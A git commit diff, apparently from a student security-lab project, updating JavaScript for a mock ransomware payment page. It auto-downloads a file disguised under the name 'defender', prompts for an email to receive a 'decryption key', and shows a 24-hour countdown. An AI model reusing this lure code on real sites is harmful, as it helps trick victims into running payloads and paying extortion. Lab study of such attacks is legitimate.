0236e38b24be1c6f8fef348cf3d37a5de0bc371f
Abhay Arora <AbhayArora@my.unt.edu>
2022-11-23 20:48:31 -0600

    ransomeware pay html code uodated

--- Infection/js/app-main.js
+++ Infection/js/app-main.js
@@ -18,15 +18,47 @@ function downloadFile() {
 */
 
 
-function downloadFile(){
-      // url="https://file.io/UYNziVaxKJgv"
-      url="/home/sec-lab/Desktop/Group8_Website/sw/test"
-      const aElement = document.createElement('a');
-      aElement.setAttribute('href', url);
-      aElement.setAttribute('download', 'defender');
-      document.body.appendChild(aElement)
-      aElement.click();
-      anchor.parentNode.removeChild(aElement)
+function downloadFile() {
+  // url="https://file.io/UYNziVaxKJgv"
+  url = "/home/sec-lab/Desktop/Group8_Website/sw/test"
+  const aElement = document.createElement('a');
+  aElement.setAttribute('href', url);
+  aElement.setAttribute('download', 'defender');
+  document.body.appendChild(aElement)
+  aElement.click();
+  anchor.parentNode.removeChild(aElement)
 
 
 }
+
+function sendEmail() {
+  var emailVal = document.getElementById('email').value
+  if (!emailVal) {
+    alert("Enter email address to receive decyrption key")
+  }
+  else {
+    alert("Email sent successfully to "+emailVal)
+  }
+
+}
+
+function showTimer() {
+  var duration = 24 * 60 * 60;
+  var display = $('#demo');
+  var timer = duration, hours, minutes, seconds;
+  setInterval(function () {
+    hours = parseInt((timer / 3600) % 24, 10)
+    minutes = parseInt((timer / 60) % 60, 10)
+    seconds = parseInt(timer % 60, 10);
+
+    hours = hours < 10 ? "0" + hours : hours;
+    minutes = minutes < 10 ? "0" + minutes : minutes;
+    seconds = seconds < 10 ? "0" + seconds : seconds;
+
+    display.text(hours + ":" + minutes + ":" + seconds);
+
+    --timer;
+  }, 1000);
+}
+
+
